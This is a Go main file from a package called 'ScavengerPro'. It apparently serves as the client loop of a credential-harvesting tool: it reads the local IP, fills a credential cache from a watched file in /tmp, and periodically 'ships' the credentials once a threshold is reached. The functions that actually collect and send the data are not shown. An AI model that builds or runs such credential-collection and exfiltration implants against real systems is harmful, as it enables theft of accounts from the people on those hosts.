// Main file for ScavengerPro package
// Get client IP, initiate cred_cache, watch files, then ship when neccessary
// @author: degenerat3
package main

import (
	"ScavengerPro/client/cred_cache"
	"net"
	"time"
)

func watch(files []string, c *cred_cache.CredCache) {
	checkFiles(files, c)
}

func ship(c *cred_cache.CredCache, min int) {
	shipIt(c, min)

}

func getIP() string {
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	ad := conn.LocalAddr().(*net.UDPAddr)
	ipStr := ad.IP.String()
	return ipStr
}

func main() {
	files := []string{"/tmp/nomnom.def"}
	min := 5
	ip := getIP()

	ca := cred_cache.CredCache{
		IP:          ip,
		Credentials: []string{},
	}
	c := &ca
	for {
		time.Sleep(2 * time.Second)
		watch(files, c)
		ship(c, min)
	}
}
